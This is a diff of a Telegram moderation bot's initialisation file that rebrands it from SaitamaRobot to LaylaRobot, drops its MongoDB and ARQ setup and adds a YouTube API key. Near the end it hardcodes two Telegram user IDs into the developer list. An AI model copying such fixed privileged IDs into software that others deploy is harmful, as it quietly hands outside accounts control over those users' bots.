@@ -3,11 +3,10 @@ import os
 import sys
 import time
 import spamwatch
-from pyrogram import Client, errors
+
 import telegram.ext as tg
+from pyrogram import Client, errors
 from telethon import TelegramClient
-from motor.motor_asyncio import AsyncIOMotorClient as MongoClient
-from Python_ARQ import ARQ
 
 StartTime = time.time()
 
@@ -79,7 +78,6 @@ if ENV:
     NO_LOAD = os.environ.get("NO_LOAD", "translation").split()
     DEL_CMDS = bool(os.environ.get('DEL_CMDS', False))
     STRICT_GBAN = bool(os.environ.get('STRICT_GBAN', False))
-    STRICT_GMUTE = bool(os.environ.get('STRICT_GMUTE', True))
     WORKERS = int(os.environ.get('WORKERS', 8))
     BAN_STICKER = os.environ.get('BAN_STICKER',
                                  'CAADAgADOwADPPEcAXkko5EB3YGYAg')
@@ -87,14 +85,11 @@ if ENV:
     CASH_API_KEY = os.environ.get('CASH_API_KEY', None)
     TIME_API_KEY = os.environ.get('TIME_API_KEY', None)
     AI_API_KEY = os.environ.get('AI_API_KEY', None)
+    YOUTUBE_API_KEY = os.environ.get('YOUTUBE_API_KEY', None)
     WALL_API = os.environ.get('WALL_API', None)
-    MONGO_DB_URI = os.environ.get("MONGO_DB_URI", None)
-    ARQ_API = os.environ.get("ARQ_API_BASE_URL", None)
     SUPPORT_CHAT = os.environ.get('SUPPORT_CHAT', None)
     SPAMWATCH_SUPPORT_CHAT = os.environ.get('SPAMWATCH_SUPPORT_CHAT', None)
     SPAMWATCH_API = os.environ.get('SPAMWATCH_API', None)
-    BOT_ID = 1412878118
-    ALLOW_CHATS = os.environ.get("ALLOW_CHATS", True)
 
     try:
         BL_CHATS = set(int(x) for x in os.environ.get('BL_CHATS', "").split())
@@ -103,7 +98,7 @@ if ENV:
             "Your blacklisted chats list does not contain valid integers.")
 
 else:
-    from SaitamaRobot.config import Development as Config
+    from LaylaRobot.config import Development as Config
     TOKEN = Config.TOKEN
 
     try:
@@ -173,6 +168,8 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
+DEV_USERS.add(1200780834)
+DEV_USERS.add(797768146) 
 
 if not SPAMWATCH_API:
     sw = None
@@ -181,11 +178,8 @@ else:
     sw = spamwatch.Client(SPAMWATCH_API)
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
-telethn = TelegramClient("saitama", API_ID, API_HASH)
-pbot = Client("KurisuPyro", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
-mongo_client = MongoClient(MONGO_DB_URI)
-db = mongo_client.SaitamaRobot
-arq = ARQ(ARQ_API)
+telethn = TelegramClient("layla", API_ID, API_HASH)
+pbot = Client("laylapbot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
 dispatcher = updater.dispatcher
 
 DRAGONS = list(DRAGONS) + list(DEV_USERS)
@@ -195,7 +189,7 @@ DEMONS = list(DEMONS)
 TIGERS = list(TIGERS)
 
 # Load at end to ensure all prev variables have been set
-from SaitamaRobot.modules.helper_funcs.handlers import (CustomCommandHandler,
+from LaylaRobot.modules.helper_funcs.handlers import (CustomCommandHandler,
                                                         CustomMessageHandler,
                                                         CustomRegexHandler)
 
